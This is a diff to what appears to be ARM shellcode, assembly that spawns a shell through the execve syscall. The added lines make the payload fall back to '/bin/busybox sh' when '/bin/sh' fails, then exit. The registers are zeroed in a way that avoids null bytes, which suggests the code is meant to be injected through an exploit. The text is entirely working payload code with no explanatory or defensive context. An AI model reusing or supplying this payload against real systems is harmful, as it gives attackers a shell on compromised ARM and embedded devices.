@@ -51,5 +51,29 @@ _start:
     eor   r2, r2, r2
     mov   r7, #11
     svc   #0
+    @ fallback: execve("/bin/busybox", ["busybox","sh"], NULL)
+    cmp   r0, #0
+    bge   done
+    adr   r0, busybox
+    sub   sp, sp, #16
+    adr   r1, bbname
+    str   r1, [sp]
+    adr   r1, shname
+    str   r1, [sp, #4]
+    eor   r1, r1, r1
+    str   r1, [sp, #8]
+    mov   r1, sp
+    eor   r2, r2, r2
+    mov   r7, #11
+    svc   #0
+done:
+    mov   r7, #1
+    svc   #0
 binsh:
     .asciz "/bin/sh"
+busybox:
+    .asciz "/bin/busybox"
+bbname:
+    .asciz "busybox"
+shname:
+    .asciz "sh"
